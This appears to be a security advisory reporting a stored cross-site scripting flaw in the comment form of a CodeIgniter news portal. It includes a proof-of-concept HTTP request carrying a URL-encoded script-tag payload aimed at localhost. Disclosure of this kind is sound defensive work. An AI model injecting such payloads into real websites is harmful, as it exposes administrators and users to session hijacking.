# News-Portal-Using-CodeIgniter
News Portal Using CodeIgniter

## Auditor

Shoaib Alam - [LinkedIn Profile](https://www.linkedin.com/in/shoaib-alam-b53843203/)

## Description

### Stored Cross-Site Scripting (XSS) Vulnerability in the Comment Section of the News Portal Application


The comment section of the news page is vulnerable to a stored Cross-Site Scripting (XSS) attack, allowing an attacker to inject malicious JavaScript code into the "message" and "name" fields of the comment form. This vulnerability arises when user input is not adequately validated or sanitized. When an administrator views the comments in the admin panel, the injected payload is executed in their browser context, leading to a range of security risks including session hijacking, unauthorized actions, and potential data breaches. This poses a significant threat to the integrity and confidentiality of user data and the overall security of the web application.

**Vulnerable Endpoint:** `/news/Welcome/post/9`  
**Vulnerable Parameter:** `name` & `comment`

## Proof of Concept (PoC)

The following HTTP request demonstrates the XSS vulnerability. This PoC illustrates how an attacker could exploit the vulnerability to execute arbitrary JavaScript in the victim's browser.

```http
POST /news/Welcome/comment HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/news/Welcome/post/9
Cookie: ci_session=blc02soj4p1oifj1am3gfiaokfjf8bdg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

type=1&postid=9&name=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&email=&comment=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
